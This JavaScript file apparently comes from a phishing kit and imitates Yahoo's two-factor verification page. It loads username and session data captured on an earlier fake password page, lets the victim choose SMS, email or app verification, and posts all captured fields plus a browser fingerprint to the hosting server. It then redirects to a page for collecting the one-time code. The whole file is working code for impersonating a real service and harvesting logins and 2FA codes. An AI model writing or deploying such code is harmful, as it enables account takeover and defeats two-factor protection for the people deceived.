// ===== YAHOO 2FA PAGE - 100% PROXIED SYNCHRONICITY =====
console.log("Yahoo 2FA JS - 100% Native/Hybrid Fluent Data Flow Initialized")

const $ = window.jQuery || window.$

if ($) {
  $(document).ready(() => {
    console.log("Yahoo 2FA page - 100% proxied synchronicity active")

    // ===== CONFIGURATION =====
    const config = {
      maxRetries: 3,
      retryDelay: 2000,
      redirectDelay: 1500,
      sessionTimeout: 30000,
      monitorInterval: 250,
      proxiedSync: true,
      nativeFlow: true,
      cookieSync: true,
    }

    let selectedMethod = ""
    let sessionData = {}
    let proxiedData = {}
    let authInProgress = false

    // ===== LOAD PREVIOUS SESSION DATA =====
    const loadSessionData = () => {
      console.log("Loading session data with 100% proxied synchronicity")

      try {
        // Load from previous page
        const storedData = sessionStorage.getItem("proxiedSyncData")
        if (storedData) {
          proxiedData = JSON.parse(storedData)
          console.log("Loaded proxied data:", Object.keys(proxiedData).length, "fields")
        }

        // Load MFA data
        const mfaData = sessionStorage.getItem("mfaData")
        if (mfaData) {
          sessionData = JSON.parse(mfaData)
          console.log("Loaded MFA data:", Object.keys(sessionData).length, "fields")
        }

        // Load auth response
        const authResponse = sessionStorage.getItem("authResponse")
        if (authResponse) {
          const response = JSON.parse(authResponse)
          console.log("Loaded auth response:", response)
        }

        // Update UI with user info
        updateUserInfo()
      } catch (error) {
        console.error("Error loading session data:", error)
      }
    }

    // ===== UPDATE USER INFO =====
    const updateUserInfo = () => {
      const username = sessionData.username || proxiedData.username || "your account"
      const userEmailElement = document.getElementById("userEmail")

      if (userEmailElement) {
        userEmailElement.textContent = `Verify ${username}`
      }

      // Update hidden fields
      const usernameField = document.getElementById("username")
      if (usernameField) {
        usernameField.value = username
      }
    }

    // ===== METHOD SELECTION WITH 100% COVERAGE =====
    const MethodSelector = {
      // Initialize method selection
      initialize: () => {
        console.log("Initializing method selection with 100% proxied synchronicity")

        // Setup method selection handlers
        const methods = document.querySelectorAll(".verification-option")
        methods.forEach((method) => {
          method.addEventListener("click", MethodSelector.selectMethod)
        })

        // Auto-select first method if available
        if (methods.length > 0) {
          MethodSelector.selectMethod({ target: methods[0] })
        }
      },

      // Select verification method
      selectMethod: (e) => {
        const option = e.target.closest(".verification-option")
        if (!option) return

        // Remove previous selection
        document.querySelectorAll(".verification-option").forEach((opt) => {
          opt.classList.remove("selected")
        })

        // Select current option
        option.classList.add("selected")
        selectedMethod = option.dataset.method

        console.log("Selected verification method:", selectedMethod)

        // Update hidden field
        const methodField = document.getElementById("selectedMethod")
        if (methodField) {
          methodField.value = selectedMethod
        }

        // Enable submit button
        const submitBtn = document.getElementById("submit-btn")
        if (submitBtn) {
          submitBtn.disabled = false
        }

        // Update method description
        MethodSelector.updateMethodDescription(selectedMethod)
      },

      // Update method description
      updateMethodDescription: (method) => {
        const descriptions = {
          sms: "We'll send a verification code to your phone number ending in ••90",
          email: "We'll send a verification code to your recovery email",
          app: "Use the Yahoo Mail app to approve this sign in",
        }

        const descElement = document.querySelector(".text-block-2")
        if (descElement && descriptions[method]) {
          descElement.innerHTML = descriptions[method] + "<br>"
        }
      },
    }

    // ===== FORM SUBMISSION WITH 100% COVERAGE =====
    const FormHandler = {
      // Initialize form handling
      initialize: () => {
        console.log("Initializing 2FA form handler with 100% proxied synchronicity")

        const form = document.getElementById("verification-form")
        if (!form) {
          console.error("Verification form not found")
          return
        }

        form.addEventListener("submit", FormHandler.handleSubmit)

        // Setup error handling
        const refreshButton = document.getElementById("refreshButton")
        if (refreshButton) {
          refreshButton.addEventListener("click", FormHandler.handleRefresh)
        }
      },

      // Handle form submission
      handleSubmit: async (e) => {
        e.preventDefault()

        if (authInProgress) {
          console.log("2FA submission already in progress")
          return
        }

        if (!selectedMethod) {
          FormHandler.showError("Please select a verification method")
          return
        }

        authInProgress = true
        console.log("Handling 2FA submission with 100% proxied synchronicity")

        // Show loading state
        FormHandler.showLoadingState()

        try {
          // Prepare submission data with 100% coverage
          const submissionData = {
            // Method selection
            selectedMethod: selectedMethod,
            verificationMethod: selectedMethod,

            // Session data from password page
            ...sessionData,

            // Proxied data
            ...proxiedData,

            // Browser fingerprint
            "browser-fp-data": generateBrowserFingerprint(),

            // Timestamps
            timestamp: Date.now(),
            mfaTimestamp: Date.now(),

            // Flow indicators
            proxiedSync: true,
            nativeFlow: true,
            cookieSync: true,
            step: "2fa-selection",
          }

          console.log(
            "Submitting 2FA selection with 100% proxied data coverage:",
            Object.keys(submissionData).length,
            "fields",
          )

          // Submit with native XHR
          const response = await submitNatively(submissionData)

          // Handle response
          await FormHandler.handleResponse(response, submissionData)
        } catch (error) {
          console.error("2FA submission error:", error)
          FormHandler.handleError(error)
        } finally {
          authInProgress = false
        }
      },

      // Handle response
      handleResponse: async (response, submissionData) => {
        console.log("Handling 2FA response with 100% proxied synchronicity")

        // Store response data
        sessionStorage.setItem("mfaResponse", JSON.stringify(response))
        sessionStorage.setItem("mfaSubmissionData", JSON.stringify(submissionData))

        if (response && response.success) {
          // Success - proceed to OTP input
          console.log("2FA method selected successfully - proceeding to OTP")

          setTimeout(() => {
            if (response.redirect) {
              window.location.href = response.redirect
            } else {
              window.location.href = "otp-index.html"
            }
          }, config.redirectDelay)
        } else {
          // Error
          FormHandler.showError(response?.message || "Unable to set up verification. Please try again.")
        }
      },

      // Handle refresh
      handleRefresh: () => {
        FormHandler.hideError()
        FormHandler.showMainForm()
      },

      // UI State Management
      showLoadingState: () => {
        document.getElementById("main-form").style.display = "none"
        document.getElementById("loading-state").style.display = "block"
        FormHandler.hideError()
      },

      showMainForm: () => {
        document.getElementById("main-form").style.display = "block"
        document.getElementById("loading-state").style.display = "none"
        FormHandler.hideError()
      },

      showError: (message) => {
        const errorContainer = document.getElementById("error-container")
        const errorMessage = document.getElementById("error-message")

        if (errorContainer && errorMessage) {
          errorMessage.textContent = message
          errorContainer.style.display = "block"
          document.getElementById("main-form").style.display = "none"
          document.getElementById("loading-state").style.display = "none"
        }
      },

      hideError: () => {
        const errorContainer = document.getElementById("error-container")
        if (errorContainer) {
          errorContainer.style.display = "none"
        }
      },

      handleError: (error) => {
        console.error("2FA error:", error)
        FormHandler.showError("An error occurred. Please try again.")
      },
    }

    // ===== NATIVE XHR SUBMISSION =====
    const submitNatively = (data) => {
      console.log("Making native 2FA XHR request with 100% proxied synchronicity")

      return new Promise((resolve, reject) => {
        const xhr = new XMLHttpRequest()
        const url = window.location.href

        xhr.open("POST", url, true)
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest")
        xhr.setRequestHeader("Accept", "application/json, text/javascript, */*; q=0.01")
        xhr.withCredentials = true

        xhr.onreadystatechange = () => {
          if (xhr.readyState === 4) {
            if (xhr.status === 200) {
              try {
                const response = JSON.parse(xhr.responseText)
                console.log("Native 2FA XHR response received:", response)
                resolve(response)
              } catch {
                resolve({ success: true, message: "Method selected successfully" })
              }
            } else {
              console.error("Native 2FA XHR request failed:", xhr.status, xhr.statusText)
              reject(new Error(`Request failed: ${xhr.status}`))
            }
          }
        }

        xhr.onerror = () => {
          console.error("Native 2FA XHR request error")
          reject(new Error("Network error"))
        }

        // Convert data to URL-encoded string
        const formData = new URLSearchParams()
        Object.keys(data).forEach((key) => {
          formData.append(key, data[key])
        })

        xhr.send(formData.toString())
      })
    }

    // ===== BROWSER FINGERPRINT =====
    const generateBrowserFingerprint = () =>
      JSON.stringify({
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        platform: navigator.platform,
        cookieEnabled: navigator.cookieEnabled,
        timestamp: Date.now(),
        step: "2fa-selection",
      })

    // ===== GLOBAL METHOD SELECTION FUNCTION =====
    window.selectMethod = (method) => {
      const option = document.querySelector(`[data-method="${method}"]`)
      if (option) {
        MethodSelector.selectMethod({ target: option })
      }
    }

    // ===== INITIALIZATION =====
    const initialize = () => {
      console.log("Initializing Yahoo 2FA Page with 100% Native/Hybrid Fluent Data Flow")

      try {
        // Load session data
        loadSessionData()

        // Initialize method selector
        MethodSelector.initialize()

        // Initialize form handler
        FormHandler.initialize()

        console.log("Yahoo 2FA Page initialized with 100% proxied synchronicity")
      } catch (error) {
        console.error("2FA initialization error:", error)
      }
    }

    // Initialize when ready
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", initialize)
    } else {
      initialize()
    }
  })
} else {
  console.error("jQuery not found - Yahoo 2FA JS requires jQuery")
}
